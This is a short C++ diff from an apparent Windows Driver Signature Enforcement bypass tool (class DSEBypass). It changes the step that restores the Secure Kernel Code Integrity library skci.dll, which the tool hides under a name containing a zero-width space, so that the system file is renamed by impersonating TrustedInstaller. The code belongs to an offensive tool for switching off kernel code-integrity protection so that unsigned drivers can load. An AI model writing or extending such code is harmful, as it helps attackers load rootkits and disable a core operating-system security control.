@@ -375,6 +375,11 @@ bool DSEBypass::RenameSkciLibrary() noexcept {
 bool DSEBypass::RestoreSkciLibrary() noexcept {
     DEBUG(L"Restoring skci.dll");
     
+    if (!m_trustedInstaller) {
+        ERROR(L"TrustedInstaller not available");
+        return false;
+    }
+    
     wchar_t sysDir[MAX_PATH];
     if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
         ERROR(L"Failed to get System32 directory");
@@ -384,13 +389,7 @@ bool DSEBypass::RestoreSkciLibrary() noexcept {
     std::wstring srcPath = std::wstring(sysDir) + L"\\skci\u200B.dll";
     std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dll";
     
-    // Admin rights sufficient for restore (no hypervisor running)
-    DWORD attrs = GetFileAttributesW(srcPath.c_str());
-    if (attrs != INVALID_FILE_ATTRIBUTES) {
-        SetFileAttributesW(srcPath.c_str(), FILE_ATTRIBUTE_NORMAL);
-    }
-    
-    if (!MoveFileW(srcPath.c_str(), dstPath.c_str())) {
+    if (!m_trustedInstaller->RenameFileAsTrustedInstaller(srcPath, dstPath)) {
         DWORD error = GetLastError();
         ERROR(L"Failed to restore skci.dll (error: %d)", error);
         return false;
